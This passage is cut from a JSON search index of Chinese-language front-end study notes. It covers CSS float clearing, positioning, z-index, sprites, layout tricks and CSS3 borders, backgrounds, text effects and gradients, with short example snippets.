时，就会影响下面的标准流盒子\"]},{\"header\":\"清除浮动本质\",\"slug\":\"清除浮动本质\",\"contents\":[\"清除浮动的本质是清除浮动元素造成的影响：浮动的子标签无法撑开父盒子的高度\",\"注意：\",\"如果父盒子本身有高度，则不需要清除浮动\",\"清除浮动之后，父级就会根据浮动的子盒子自动检测高度\",\"父级有了高度，就不会影响下面的标准流了\"]},{\"header\":\"清除浮动样式\",\"slug\":\"清除浮动样式\",\"contents\":[\"语法：\",\" 选择器{clear:属性值;} \",\"属性值\",\"描述\",\"left\",\"不允许左侧有浮动元素（清除左侧浮动的影响）\",\"right\",\"不允许右侧有浮动元素（清除右侧浮动的影响）\",\"both\",\"同时清除左右两侧浮动的影响\",\"清除浮动的策略是: 闭合浮动\"]},{\"header\":\"清除浮动的多种方式\",\"slug\":\"清除浮动的多种方式\",\"contents\":[]},{\"header\":\"额外标签法\",\"slug\":\"额外标签法\",\"contents\":[\"额外标签法也称为隔墙法，是 W 3 C 推荐的做法\",\"使用方式：额外标签法会在浮动元素末尾添加一个空的标签\",\"例如 <div style=\\\"clear:both\\\"></div>，或者其他标签（如<br />等） \",\"优点： 通俗易懂，书写方便\",\"缺点： 添加许多无意义的标签，结构化较差\",\"注意： 要求这个新的空标签必须是块级元素\"]},{\"header\":\"父级添加 overflow 属性\",\"slug\":\"父级添加-overflow-属性\",\"contents\":[\"可以给父级添加 overflow 属性，将其属性值设置为 hidden、 auto 或 scroll\",\"例如：\",\"overflow:hidden | auto | scroll; \",\"优点：代码简洁\",\"缺点：无法显示溢出的部分\",\"注意：是给父元素添加代码\"]},{\"header\":\"父级添加 after 伪元素\",\"slug\":\"父级添加-after-伪元素\",\"contents\":[\":after 方式是额外标签法的升级版。给父元素添加：\",\" .clearfix:after { content: \\\"\\\"; display: block; height: 0; clear: both; visibility: hidden; } .clearfix { /* IE6、7 专有 */ *zoom: 1; } \",\"优点：没有增加标签，结构更简单\",\"缺点：兼容性问题\"]},{\"header\":\"父级添加双伪元素\",\"slug\":\"父级添加双伪元素\",\"contents\":[\"给父元素添加：\",\" .clearfix:before,.clearfix:after { content:\\\"\\\"; display:table; } .clearfix:after { clear:both; } .clearfix { *zoom:1; } \",\"优点：代码更简洁\",\"缺点：兼容性问题\"]},{\"header\":\"总结\",\"slug\":\"总结\",\"contents\":[\"为什么需要清除浮动？\",\"父级没高度\",\"子盒子浮动了\",\"影响下面布局了，我们就应该清除浮动了\",\"清除浮动的方式\",\"优点\",\"缺点\",\"额外标签法\",\"通俗易懂，书写方便\",\"添加许多无意义的标签，结构化较差\",\"父级 overflow:hidden;\",\"书写简单\",\"溢出隐藏\",\"父级 after 伪元素\",\"结构语义化，代码简洁\",\"兼容性问题\",\"父级双伪元素\",\"结构语义化，代码简洁\",\"兼容性问题\"]},{\"header\":\"定位\",\"slug\":\"定位\",\"contents\":[]},{\"header\":\"为什么使用定位\",\"slug\":\"为什么使用定位\",\"contents\":[\"浮动可以让多个块级盒子一行没有缝隙排列显示，经常用于横向排列盒子\",\"定位则是可以让盒子自由的在某个盒子内移动位置或者固定屏幕中某个位置，并且可以压住其他盒子\"]},{\"header\":\"定位组成\",\"slug\":\"定位组成\",\"contents\":[\"定位：将盒子定在某一个位置，所以定位也是在摆放盒子，按照定位的方式移动盒子\",\"定位也是用来布局的，它有两部分组成：定位 = 定位模式 + 边偏移\",\"定位模式 用于指定一个元素在文档中的定位方式\",\"边偏移则决定了该元素的最终位置\"]},{\"header\":\"边偏移（方位名词）\",\"slug\":\"边偏移-方位名词\",\"contents\":[\"边偏移 就是定位的盒子移动到最终位置。有 top、bottom、left 和 right 4 个属性\",\"边偏移属性\",\"示例\",\"描述\",\"top\",\"top: 80px\",\"顶端偏移量，定义元素相对于其父元素上边线的距离\",\"bottom\",\"bottom: 80px\",\"底部偏移量，定义元素相对于其父元素下边线的距离\",\"left\",\"left: 80px\",\"左侧偏移量，定义元素相对于其父元素左边线的距离\",\"right\",\"right: 80px\",\"右侧偏移量，定义元素相对于其父元素右边线的距离\",\"定位的盒子有了边偏移才有价值。一般情况下，凡是有定位的地方必有边偏移\"]},{\"header\":\"定位模式 (position)\",\"slug\":\"定位模式-position\",\"contents\":[\"在 CSS 中，通过 position 属性定义元素的定位模式，语法如下：\",\"选择器 { position: 属性值; } \",\"定位模式是有不同分类的，在不同情况下，我们用到不同的定位模式\",\"定位模式决定元素的定位方式，它通过 CSS 的 position 属性来设置，其值可以分为四个：\",\"值\",\"语义\",\"static\",\"静态定位\",\"relative\",\"相对定位\",\"absolute\",\"绝对定位\",\"fixed\",\"固定定位\"]},{\"header\":\"静态定位 (static)\",\"slug\":\"静态定位-static\",\"contents\":[\"静态定位是元素的默认定位方式，无定位的意思，在不需要定位的时候用\",\"语法：\",\"选择器 { position: static; } \",\"静态定位按照标准流特性摆放位置，它没有边偏移，静态定位在布局时几乎不用\"]},{\"header\":\"相对定位 (relative)\",\"slug\":\"相对定位-relative\",\"contents\":[\"相对定位是元素在移动位置的时候，是相对于它自己原来的位置来说的\",\"语法：\",\"选择器 { position: relative; } \",\"相对定位的特点：（务必记住）\",\"它是相对于自己原来的位置来移动的（移动位置的时候参照点是自己原来的位置）\",\"原来在标准流的位置继续占有，后面的盒子仍然以标准流的方式对待它，因此，相对定位并没有脱标\"]},{\"header\":\"绝对定位 (absolute)\",\"slug\":\"绝对定位-absolute\",\"contents\":[]},{\"header\":\"绝对定位的介绍\",\"slug\":\"绝对定位的介绍\",\"contents\":[\"绝对定位是元素在移动位置的时候，是相对于它祖先元素来说的\",\"语法：\",\" 选择器 { position: absolute; } \",\"绝对定位的特点：\",\"完全脱标 —— 完全不占位置\",\"如果没有祖先元素或者祖先元素没有定位，则以浏览器为准定位（Document 文档）\",\"如果祖先元素有定位 (相对、绝对、固定定位)，则以最近一级的有定位祖先元素为参考点移动位置\"]},{\"header\":\"定位口诀 —— 子绝父相\",\"slug\":\"定位口诀-——-子绝父相\",\"contents\":[\"子级是绝对定位的话，父级要用相对定位\",\"子级绝对定位，不会占有位置，可以放到父盒子里面的任何一个地方，不会影响其他的兄弟盒子\",\"父盒子需要加定位限制子盒子在父盒子内显示\",\"父盒子布局时，需要占有位置，因此父亲只能是相对定位\",\"父级要占有位置，子级要任意摆放这就是子绝父相的由来，所以相对定位经常用来作为绝对定位的父级\",\"总结： 因为父级需要占有位置，因此是相对定位， 子盒子不需要占有位置，则是绝对定位\",\"当然，子绝父相不是永远不变的，如果父元素不需要占有位置，子绝父绝也会遇到\"]},{\"header\":\"固定定位 (fixed)\",\"slug\":\"固定定位-fixed\",\"contents\":[\"固定定位是元素固定于浏览器可视区的位置\",\"主要使用场景：可以在浏览器页面滚动时元素的位置不会改变\",\"语法：\",\" 选择器 { position: fixed; } \",\"固定定位的特点：\",\"以浏览器的可视窗口为参照点移动元素\",\"跟父元素没有任何关系\",\"不随滚动条滚动\",\"固定定位不再占有原先的位置\",\"固定定位也是脱标的，其实固定定位也可以看做是一种特殊的绝对定位\"]},{\"header\":\"粘性定位 (sticky)\",\"slug\":\"粘性定位-sticky\",\"contents\":[\"粘性定位可以被认为是相对定位和固定定位的混合\",\"语法：\",\" 选择器 { position: sticky; top: 10px; } \",\"粘性定位的特点：\",\"以浏览器的可视窗口为参照点移动元素（固定定位特点）\",\"粘性定位占有原先的位置（相对定位特点）\",\"必须添加 top 、left、right、bottom 其中一个才有效\"]},{\"header\":\"总结\",\"slug\":\"总结-1\",\"contents\":[\"定位模式\",\"是否脱标\",\"移动位置\",\"是否常用\",\"static 静态定位\",\"否\",\"不能使用边偏移\",\"很少\",\"relative 相对定位\",\"否 (占有位置)\",\"相对于自身位置移动\",\"基本单独使用\",\"absolute绝对定位\",\"是（不占有位置）\",\"带有定位的父级\",\"要和定位父级元素搭配使用\",\"fixed 固定定位\",\"是（不占有位置）\",\"浏览器可视区\",\"单独使用，不需要父级\",\"sticky 粘性定位\",\"否 (占有位置)\",\"浏览器可视区\",\"当前阶段少\",\"注意：\",\"边偏移需要和定位模式联合使用，单独使用无效\",\"top 和 bottom 不要同时使用\",\"left 和 right 不要同时使用\"]},{\"header\":\"定位的应用\",\"slug\":\"定位的应用\",\"contents\":[\"固定定位小技巧： 固定在版心右侧位置\",\"小算法：\",\"让固定定位的盒子 left: 50%;，走到浏览器可视区（也可以看做版心）的一半位置\",\"让固定定位的盒子 margin-left: 版心宽度的一半距离; 多走版心宽度的一半位置\",\"就可以让固定定位的盒子贴着版心右侧对齐了\"]},{\"header\":\"定位堆叠顺序 (z-index)\",\"slug\":\"定位堆叠顺序-z-index\",\"contents\":[\"在使用定位布局时，可能会出现盒子重叠的情况，此时，可以使用 z-index 来控制盒子的前后次序 (z 轴)\",\"语法：\",\"选择器 { z-index: 1; } \",\"z-index 的特性如下：\",\"属性值：正整数、负整数或0，默认值是0，数值越大，盒子越靠上\",\"如果属性值相同，则按照书写顺序，后来者居上\",\"数字后面不能加单位\",\"注意：z-index 只能应用于相对定位、绝对定位和固定定位的元素，其他标准流、浮动和静态定位无效\"]},{\"header\":\"定位的拓展\",\"slug\":\"定位的拓展\",\"contents\":[]},{\"header\":\"绝对定位的盒子居中\",\"slug\":\"绝对定位的盒子居中\",\"contents\":[\"注意：加了绝对定位/固定定位的盒子不能通过设置 margin: auto 设置水平居中，但是可以通过以下计算方法实现水平和垂直居中，可以按照下图的方法：\",\"left: 50%; 让盒子的左侧移动到父级元素的水平中心位置\",\"margin-left: -x px; 让盒子向左移动自身宽度的一半\"]},{\"header\":\"定位特殊特性\",\"slug\":\"定位特殊特性\",\"contents\":[\"绝对定位和固定定位也和浮动类似：\",\"行内元素添加绝对或者固定定位，可以直接设置高度和宽度\",\"块级元素添加绝对或者固定定位，如果不给宽度或者高度，默认大小是内容的大小\",\"display 是显示模式，可以改变显示模式有以下方式:\",\"可以用 inline-block 转换为行内块\",\"可以用浮动 float 默认转换为行内块（类似，并不完全一样，因为浮动是脱标的）\",\"绝对定位和固定定位也和浮动类似，默认转换的特性转换为行内块\",\"所以说，一个行内的盒子，如果加了浮动、固定定位和绝对定位，不用转换，就可以给这个盒子直接设置宽度和高度等\"]},{\"header\":\"脱标的盒子不会触发外边距塌陷\",\"slug\":\"脱标的盒子不会触发外边距塌陷\",\"contents\":[\"浮动元素、绝对定位 (固定定位）元素的都不会触发外边距合并的问题\",\"也就是说，我们给盒子改为了浮动或者定位，就不会有垂直外边距合并的问题\"]},{\"header\":\"绝对定位 (固定定位)会完全压住盒子\",\"slug\":\"绝对定位-固定定位-会完全压住盒子\",\"contents\":[\"浮动元素不同，只会压住它下面标准流的盒子，但是不会压住下面标准流盒子里面的文字，但是绝对定位（固定定位）会压住下面标准流所有的内容\",\"浮动之所以不会压住文字，因为浮动产生的目的最初是为了做文字环绕效果的，文字会围绕浮动元素\"]}]},\"/front-end/css-notes/10-CSS%E7%B2%BE%E7%81%B5%E5%9B%BE.html\":{\"title\":\"CSS精灵图\",\"contents\":[{\"header\":\"为什么需要精灵图\",\"slug\":\"为什么需要精灵图\",\"contents\":[\"一个网页中往往会应用很多小的背景图像作为修饰，当网页中的图像过多时，服务器就会频繁地接收和发送请求图片，造成服务器请求压力过大，这将大大降低页面的加载速度\",\"为了有效地减少服务器接收和发送请求的次数，提高页面的加载速度，出现了 CSS 精灵技术（也称 CSS Sprites、CSS 雪碧图）\",\"核心原理：将网页中的一些小背景图像整合到一张大图中，这样服务器只需要一次请求就可以了\"]},{\"header\":\"精灵图（sprites）的使用\",\"slug\":\"精灵图-sprites-的使用\",\"contents\":[\"使用精灵图核心：\",\"精灵技术主要针对于背景图片使用。就是把多个小背景图片整合到一张大图片中\",\"这个大图片也称为 sprites 精灵图或者雪碧图\",\"移动背景图片位置，此时可以使用 background-position\",\"移动的距离就是这个目标图片的 x 和 y 坐标。注意网页中的坐标有所不同\",\"因为一般情况下都是往上往左移动，所以数值是负值\",\"使用精灵图的时候需要精确测量，每个小背景图片的大小和位置\",\"例：\",\"效果：\",\"CSS精灵图01.png\",\"精灵图：\",\"CSS精灵图02.jpg\",\"结构：\",\"<span class=\\\"p\\\">p</span> <span class=\\\"i\\\">i</span> <span class=\\\"n\\\">n</span> <span class=\\\"k\\\">k</span> \",\"样式：\",\"span { display: inline-block; background: url(images/abcd.jpg) no-repeat; } .p { width: 100px; height: 112px; /* background-color: pink; */ background-position: -493px -276px; } .i { width: 60px; height: 108px; /* background-color: pink; */ background-position: -327px -142px; } .n { width: 108px; height: 109px; /* background-color: pink; */ background-position: -215px -141px; } .k { width: 105px; height: 114px; /* background-color: pink; */ background-position: -495px -142px; } \"]}]},\"/front-end/css-notes/11-CSS%E5%B8%83%E5%B1%80%E6%8A%80%E5%B7%A7.html\":{\"title\":\"CSS布局技巧\",\"contents\":[{\"header\":\"margin 负值运用\",\"slug\":\"margin-负值运用\",\"contents\":[\"让每个盒子 margin 往左侧移动 -1 px 正好压住相邻盒子边框\",\"鼠标经过某个盒子的时候，提高当前盒子的层级即可（如果没有有定位，则加相对定位（保留位置），如果有定位，则加（z-index）\",\"<ul> <li>1</li> <li>2</li> <li>3</li> <li>4</li> <li>5</li> </ul> \",\"ul li { position: relative; float: left; list-style: none; width: 150px; height: 200px; border: 1px solid red; margin-left: -1px; } ul li:hover { z-index: 1; border: 1px solid blue; } \"]},{\"header\":\"文字围绕浮动元素\",\"slug\":\"文字围绕浮动元素\",\"contents\":[\"运用浮动元素不会压住文字的特性实现\"]},{\"header\":\"行内块巧妙运用\",\"slug\":\"行内块巧妙运用\",\"contents\":[\"页面底部页码栏\",\"页码在页面中间显示:\",\"把这些链接盒子转换为行内块，之后给父级指定 text-align: center;\",\"利用行内块元素中间有缝隙，并且给父级添加 text-align: center; 行内块元素会水平会居中\"]},{\"header\":\"CSS 三角形\",\"slug\":\"css-三角形\",\"contents\":[\"网页中常见一些三角形，使用 CSS 直接画出来就可以，不必做成图片或者字体图标\",\" .box1 { width: 0; height: 0; border-top: 10px solid pink; border-right: 10px solid red; border-bottom: 10px solid blue; border-left: 10px solid green; } .box2 { width: 0; height: 0; border: 50px solid transparent; border-top-color: pink; margin: 100px auto; } \",\"CSS布局01.png\",\"我们用 CSS 边框可以模拟三角效果\",\"宽度高度为 0\",\"我们 4 个边框都要写，只保留需要的边框颜色，其余的不能省略，都改为 transparent 透明就好了\",\"为了照顾兼容性低版本的浏览器，加上 font-size: 0;line-height: 0;\"]},{\"header\":\"关于默认宽度\",\"slug\":\"关于默认宽度\",\"contents\":[\"所谓的默认宽度，就是不设置 width 属性时，元素所呈现出来的宽度 总宽度 = 父的content - 自身的左右margin 内容区的宽度 = 父的content - 自身的左右margin - 自身的左右border - 自身的左右padding\"]},{\"header\":\"行内元素、行内块元素，可以被父元素当做文本处理\",\"slug\":\"行内元素、行内块元素-可以被父元素当做文本处理\",\"contents\":[]},{\"header\":\"如何让子元素在父亲中水平居中\",\"slug\":\"如何让子元素在父亲中水平居中\",\"contents\":[\"若子元素为块元素，给父元素加上： margin:0 auto; 若子元素为行内元素、行内块元素，给父元素加上： text-align:center;\"]},{\"header\":\"如何让子元素，在父亲中垂直居中\",\"slug\":\"如何让子元素-在父亲中垂直居中\",\"contents\":[\"（若想绝对垂直居中，父元素 font-size 设置为 0）\",\"若子元素为块元素，给子元素加上： margin-top ，值为：(父元素content －子元素盒子总高) / 2 若子元素为行内元素、行内块元素：让父元素的 height = line-height ，每个子元素都加上： vertical-align: middle;\"]},{\"header\":\"元素之间的空白问题\",\"slug\":\"元素之间的空白问题\",\"contents\":[\"产生原因：行内元素、行内块元素，彼此之间的换行会被浏览器解析为一个空白字符 解决方案： 方案一： 去掉换行和空格（不推荐） 方案二： 给父元素设置 font-size: 0 ，再给需要显示文字的元素，单独设置字体大小（推荐）\"]},{\"header\":\"行内块的幽灵空白问题\",\"slug\":\"行内块的幽灵空白问题\",\"contents\":[\"产生原因：行内块元素与文本的基线对齐，而文本的基线与文本最底端之间是有一定距离的 解决方案： 方案一： 给行行内块设置 vertical-align ，值不为 baseline 即可，设置为 middel 、 bottom 、 top 均可 方案二： 若父元素中只有一张图片，设置图片为 display: block; 方案三： 给父元素设置 font-size: 0; 。如果该行内块内部还有文本，则需单独设置 font-size\"]},{\"header\":\"常用布局名词\",\"slug\":\"常用布局名词\",\"contents\":[\"位置\",\"名词\",\"顶部导航条\",\"topbar\",\"页头\",\"header、page-header\",\"导航\",\"nav、navigator、navbar\",\"搜索框\",\"search、search-box\",\"横幅、广告、宣传图\",\"banner\",\"主要内容\",\"content、main\",\"侧边栏\",\"aside、sidebar\",\"页脚\",\"footer、page-footer\"]},{\"header\":\"重置默认样式（CSS初始化）\",\"slug\":\"重置默认样式-css初始化\",\"contents\":[\"很多元素都有默认样式，比如：\",\"p 元素有默认的上下 margin\",\"h1~h6 标题也有上下 margin ，且字体加粗\",\"body 元素有默认的 8px 外边距\",\"超链接有默认的文字颜色和下划线\",\"ul 元素有默认的左 pading\",\"……\"]},{\"header\":\"使用全局选择器\",\"slug\":\"使用全局选择器\",\"contents\":[\"* { margin: 0; padding: 0; ...... } \"]},{\"header\":\"reset.css\",\"slug\":\"reset-css\",\"contents\":[\"选择到具有默认样式的元素，清空其默认的样式\"]},{\"header\":\"Normalize.css\",\"slug\":\"normalize-css\",\"contents\":[\"Normalize.css 是一种最新方案，它在清除默认样式的基础上，保留了一些有价值的默认样式\",\"官网地址：Normalize.css\",\"相对于 reset.css ， Normalize.css 有如下优点：\",\"保护了有价值的默认样式，而不是完全去掉它们\",\"为大部分 HTML 元素提供一般化的样式\",\"新增对 HTML5 元素的设置\",\"对并集选择器的使用比较谨慎，有效避免调试工具杂乱\"]}]},\"/front-end/css-notes/12-CSS3%E7%AE%80%E4%BB%8B.html\":{\"title\":\"CSS3简介\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS3 是 CSS2 的升级版本，它在 CSS2 的基础上，新增了很多强大的新功能，从而解决一些实际面临的问题\",\"CSS3 在未来会按照模块化的方式去发展，一些最重要CSS3模块：\",\"选择器\",\"盒模型\",\"背景和边框\",\"文字特效\",\"2D/3D转换\",\"动画\",\"多列布局\",\"用户界面\",\"CSS3 的新特性如下：\",\"新增了更加实用的选择器，例如：动态伪类选择器、目标伪类选择器、伪元素选择器等等\",\"新增了更好的视觉效果，例如：圆角、阴影、渐变等\",\"新增了丰富的背景效果，例如：支持多个背景图片，同时新增了若干个背景相关的属性\",\"新增了全新的布局方案 —— 弹性盒子\",\"新增了 Web 字体，可以显示用户电脑上没有安装的字体\",\"增强了颜色，例如： HSL 、 HSLA 、 RGBA 几种新的颜色模式，新增 opacity 属性来控制透明度\",\"增加了 2D 和 3D 变换，例如：旋转、扭曲、缩放、位移等\",\"增加动画与过渡效果，让效果的变换更具流线性、平滑性\",\"……\"]}]},\"/front-end/css-notes/13-CSS3%E6%B5%8F%E8%A7%88%E5%99%A8%E7%A7%81%E6%9C%89%E5%89%8D%E7%BC%80.html\":{\"title\":\"CSS3浏览器私有前缀\",\"contents\":[{\"header\":\"什么是私有前缀？\",\"slug\":\"什么是私有前缀\",\"contents\":[\"如下代码中的 -webkit- 就是私有前缀\",\"div { width:400px; height:400px; -webkit-border-radius: 20px; } \"]},{\"header\":\"为什么要有私有前缀\",\"slug\":\"为什么要有私有前缀\",\"contents\":[\"W3C 标准所提出的某个 CSS 特性，在被浏览器正式支持之前，浏览器厂商会根据浏览器的内核，使用私有前缀来测试该 CSS 特性，在浏览器正式支持该 CSS 特性后，就不需要私有前缀了\",\"查询 CSS3 兼容性的网站：Can I use... Support tables for HTML5, CSS3\",\"常见浏览器私有前缀:\",\"Chrome 浏览器： -webkit-\",\"Safari 浏览器： -webkit-\",\"Firefox 浏览器： -moz-\",\"Edge 浏览器：-webkit-\",\"旧 Opera 浏览器： -o-\",\"旧 IE 浏览器： -ms-\"]}]},\"/front-end/css-notes/14-CSS3%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7.html\":{\"title\":\"CSS3自定义属性\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS3自定义属性是一种定义在 :root 参照根元素上的属性，可以被所有后代元素所继承和使用\",\"自定义属性可以用 -- 作为前缀来定义，如：--primary-color: #ff0000\",\"定义自定义属性后，可以在任何CSS规则内使用var()函数来引用自定义属性的值\",\"示例：\",\"定义一个自定义属性：\",\":root { --primary-color: #ff0000; } \",\"使用自定义属性：\",\"body { background-color: var(--primary-color); } \",\"在上述代码中，我们定义了一个名为 --primary-color 的自定义属性，并将其值设置为红色。在 body 元素的CSS规则中，我们使用 var() 函数来引用这个自定义属性，并将其值设置为 background-color 的值，这样 body 的背景色会使用 --primary-color 自定义属性的值，即红色\",\"使用自定义属性的好处是代码的可重用性和构建更易于维护的样式库，可以使开发者在整个网站中更容易地应用相同的样式属性\"]}]},\"/front-end/css-notes/15-CSS3%E9%80%89%E6%8B%A9%E5%99%A8.html\":{\"title\":\"CSS3选择器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"CSS3新增的选择器有：动态伪类、目标伪类、语言伪类、 UI 伪类、结构伪类、否定伪类、伪元素，具体内容看前面CSS选择器部分\"]}]},\"/front-end/css-notes/16-CSS3%E8%BE%B9%E6%A1%86.html\":{\"title\":\"CSS3边框\",\"contents\":[{\"header\":\"盒子阴影\",\"slug\":\"盒子阴影\",\"contents\":[\"使用 box-shadow 属性为盒子添加阴影\",\"语法：\",\" box-shadow: h-shadow v-shadow blur spread color inset; \",\"值\",\"描述\",\"h-shadow\",\"必需。水平阴影的位置，允许负值\",\"v-shadow\",\"必需。垂直阴影的位置，允许负值\",\"blur\",\"可选。模糊距离\",\"spread\",\"可选。阴影的尺寸\",\"color\",\"可选。阴影的颜色\",\"inset\",\"可选。将外部阴影 (outset)改为内部阴影\",\"注意：\",\"box-shadow-none，表示没有阴影\",\"默认的是外阴影（outset），但是不可以写，否则会造成阴影无效\",\"盒子阴影不占用空间，不会影响其它盒子排列\",\"例：\",\"/* 写两个值，含义：水平位置、垂直位置 */ box-shadow: 10px 10px; /* 写三个值，含义：水平位置、垂直位置、颜色 */ box-shadow: 10px 10px red; /* 写三个值，含义：水平位置、垂直位置、模糊值 */ box-shadow: 10px 10px 10px; /* 写四个值，含义：水平位置、垂直位置、模糊值、颜色 */ box-shadow: 10px 10px 10px red; /* 写五个值，含义：水平位置、垂直位置、模糊值、外延值、颜色 */ box-shadow: 10px 10px 10px 10px blue; /* 写六个值，含义：水平位置、垂直位置、模糊值、外延值、颜色、内阴影 */ box-shadow: 10px 10px 20px 3px blue inset; \"]},{\"header\":\"圆角边框\",\"slug\":\"圆角边框\",\"contents\":[\"使用 border-radius 属性用于设置元素的外边框圆角\",\"语法：\",\" border-radius:length; \",\"参数值可以为数值或百分比的形式\",\"如果是正方形，想要设置为一个圆，把数值修改为高度或者宽度的一半即可，或者直接写为 50%\",\"该属性是一个简写属性，可以跟四个值，分别代表左上角、右上角、右下角、左下角\",\"分开写：border-top-left-radius、border-top-right-radius、border-bottom-right-radius 和 border-bottom-left-radius\"]},{\"header\":\"边框外轮廓\",\"slug\":\"边框外轮廓\",\"contents\":[\"outline-width ：外轮廓的宽度\",\"outline-color ：外轮廓的颜色\",\"outline-style ：外轮廓的风格\",\"none ： 无轮廓\",\"dotted ： 点状轮廓\",\"dashed ： 虚线轮廓\",\"solid ： 实线轮廓\",\"double ： 双线轮廓\",\"outline-offset 设置外轮廓与边框的距离，正负值都可以设置（注意，outline-offset 不是 outline 的子属性，是一个独立的属性）\",\"outline 复合属性 outline:50px solid blue;\",\"注意，轮廓与边框有两点不同：\",\"轮廓不占用空间\",\"轮廓可能是非矩形\"]}]},\"/front-end/css-notes/17-CSS3%E8%83%8C%E6%99%AF.html\":{\"title\":\"CSS3背景\",\"contents\":[{\"header\":\"background-origin\",\"slug\":\"background-origin\",\"contents\":[\"作用：设置背景图的原点\",\"属性值：\",\"padding-box ：从 padding 区域开始显示背景图像。—— 默认值\",\"border-box ： 从 border 区域开始显示背景图像\",\"content-box ： 从 content 区域开始显示背景图像\"]},{\"header\":\"background-clip\",\"slug\":\"background-clip\",\"contents\":[\"作用：设置背景图的向外裁剪的区域\",\"属性值：\",\"border-box ： 从 border 区域开始向外裁剪背景。 —— 默认值\",\"padding-box ： 从 padding 区域开始向外裁剪背景\",\"content-box ： 从 content 区域开始向外裁剪背景\",\"text ：背景图只呈现在文字上（backgroun-clip 要加上 -webkit- 前缀）\"]},{\"header\":\"background-size\",\"slug\":\"background-size\",\"contents\":[\"作用：设置背景图的尺寸\",\"属性值：\",\"用长度值指定背景图片大小，不允许负值 background-size: 300px 200px;\",\"用百分比指定背景图片大小，不允许负值 background-size: 100% 100%;\",\"auto：背景图片的真实大小。 —— 默认值\",\"contain：将背景图片等比缩放，使背景图片的宽或高，与容器的宽或高相等，再将完整背景图片包含在容器内，但要注意：可能会造成容器里部分区域没有背景图片 background-size: contain;\",\"cover：将背景图片等比缩放，直到完全覆盖容器，图片会尽可能全的显示在元素上，但要注意：背景图片有可能显示不完整。—— 相对比较好的选择 background-size: cover;\"]},{\"header\":\"background 复合属性\",\"slug\":\"background-复合属性\",\"contents\":[\"语法：\",\"background: color url repeat position / size origin clip \",\"注意：\",\"origin 和 clip 的值如果一样，如果只写一个值，则 origin 和 clip 都设置；如果设置了两个值，前面的是 origin ，后面的 clip\",\"size 的值必须写在 position 值的后面，并且用 / 分开\"]},{\"header\":\"多背景图\",\"slug\":\"多背景图\",\"contents\":[\"CSS3 允许元素设置多个背景图片\",\"/* 添加多个背景图 */ background: url(../images/bg-lt.png) no-repeat, url(../images/bg-rt.png) no-repeat right top, url(../images/bg-lb.png) no-repeat left bottom, url(../images/bg-rb.png) no-repeat right bottom; \"]}]},\"/front-end/css-notes/18-CSS3%E6%96%87%E6%9C%AC%E6%95%88%E6%9E%9C.html\":{\"title\":\"CSS3文本效果\",\"contents\":[{\"header\":\"文本阴影\",\"slug\":\"文本阴影\",\"contents\":[\"在 CSS 3 中，我们可以使用 text-shadow 属性将阴影应用于文本\",\"语法：\",\" text-shadow: h-shadow v-shadow blur color; \",\"值\",\"描述\",\"h-shadow\",\"必需。水平阴影的位置，允许负值\",\"v-shadow\",\"必需。垂直阴影的位置，允许负值\",\"blur\",\"可选。模糊的距离\",\"color\",\"可选。阴影的颜色\",\"默认值：text-shadow: none; 表示没有阴影\"]},{\"header\":\"文本换行\",\"slug\":\"文本换行\",\"contents\":[\"在 CSS3 中，我们可以使用 white-space 属性设置文本换行方式\",\"常用值如下：\",\"值\",\"含义\",\"normal\",\"文本超出边界自动换行，文本中的换行被浏览器识别为一个空格（默认值）\",\"pre\",\"原样输出，与 pre 标签的效果相同\",\"pre-wrap\",\"在 pre 效果的基础上，超出元素边界自动换行\",\"pre-line\",\"在 pre 效果的基础上，超出元素边界自动换行，且识别文本中的换行，空格会忽略\",\"nowrap\",\"强制不换行\"]},{\"header\":\"文本溢出\",\"slug\":\"文本溢出\",\"contents\":[\"在 CSS3 中，我们可以使用 text-overflow 属性设置文本内容溢出时的呈现模式\",\"常用值如下：\",\"值\",\"含义\",\"clip\",\"当内联内容溢出时，将溢出部分裁切掉（默认值）\",\"ellipsis\",\"当内联内容溢出块容器时，将溢出部分替换为 …\",\"注意：要使得 text-overflow 属性生效，块容器必须显式定义 overflow 为非 visible 值， white-space 为 nowrap 值\"]},{\"header\":\"文本修饰\",\"slug\":\"文本修饰\",\"contents\":[\"CSS3 升级了 text-decoration 属性，让其变成了复合属性\",\"text-decoration: text-decoration-line || text-decoration-style || text-decoration-color \",\"子属性及其含义：\",\"text-decoration-line 设置文本装饰线的位置 \",\"none ： 指定文字无装饰 （默认值）\",\"underline ： 指定文字的装饰是下划线\",\"overline ： 指定文字的装饰是上划线\",\"line-through ： 指定文字的装饰是贯穿线\",\"text-decoration-style 文本装饰线条的形状 \",\"solid ： 实线 （默认）\",\"double ： 双线\",\"dotted ： 点状线条\",\"dashed ： 虚线\",\"wavy ： 波浪线\",\"text-decoration-color 文本装饰线条的颜色\"]},{\"header\":\"文本描边\",\"slug\":\"文本描边\",\"contents\":[\"注意：文字描边功能仅 webkit 内核浏览器支持\",\"-webkit-text-stroke-width ：设置文字描边的宽度，写长度值\",\"-webkit-text-stroke-color ：设置文字描边的颜色，写颜色值\",\"-webkit-text-stroke ：复合属性，设置文字描边宽度和颜色\"]}]},\"/front-end/css-notes/19-CSS3%E6%B8%90%E5%8F%98.html\":{\"title\":\"CSS3渐变\",\"contents\":[{\"header\":\"线性渐变\",\"slug\":\"线性渐变\",\"contents\":[\"多个颜色之间的渐变，默认从上到下渐变\",\"CSS3渐变01.png\",\"background-image:linear-gradient(red,yellow,green); \",\"使用关键词设置线性渐变的方向\",\"CSS3渐变02.png\",\"background-image: linear-gradient(to right top,red,yellow,green); \",\"使用角度设置线性渐变的方向\",\"CSS3渐变03.png\",\"background-image: linear-gradient(30deg,red,yellow,green); \",\"调整开始渐变的位置\",\"CSS3渐变04.png\",\"background-image: linear-gradient(red 50px,yellow 100px ,green 150px); \"]},{\"header\":\"径向渐变\",\"slug\":\"径向渐变\",\"contents\":[\"多个颜色之间的渐变，默认从圆心四散。（注意：不一定是正圆，要看容器本身宽高比）\",\"CSS3渐变05.png\",\"background-image: radial-gradient(red,yellow,green); \",\"使用关键词调整渐变圆的圆心位置\",\"CSS3渐变06.png\",\"background-image: radial-gradient(at right top,red,yellow,green); \",\"使用像素值调整渐变圆的圆心位置\",\"CSS3渐变07.png\",\"background-image: radial-gradient(at 100px 50px,red,yellow,green); \",\"调整渐变形状为正圆\",\"CSS3渐变08.png\",\"background-image: radial-gradient(circle,red,yellow,green); 